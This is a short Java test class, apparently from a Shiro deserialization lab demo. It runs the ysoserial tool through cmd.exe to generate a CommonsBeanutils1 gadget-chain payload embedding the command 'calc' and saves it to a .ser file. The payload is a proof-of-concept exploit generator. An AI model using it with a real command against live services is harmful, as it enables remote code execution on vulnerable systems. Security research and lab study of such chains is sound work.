package priv.ga0weI.demoshrio;

import java.io.File;

public class Test {
    public static void main(String[] args) {
        String path = System.getProperty("user.dir");
        String cmd = "calc";
        try {
//            Runtime.getRuntime().exec("java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \"" + cmd + "\" > xxxxx.ser", null, new File(path));
            Runtime.getRuntime().exec("C:/Windows/System32/cmd.exe /c java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 \"" + cmd + "\" > xxxxx.ser", null, new File(path));
            System.out.println("生成payload成功");
        }catch (Exception e){
            System.out.println(path);
        }

    }
}
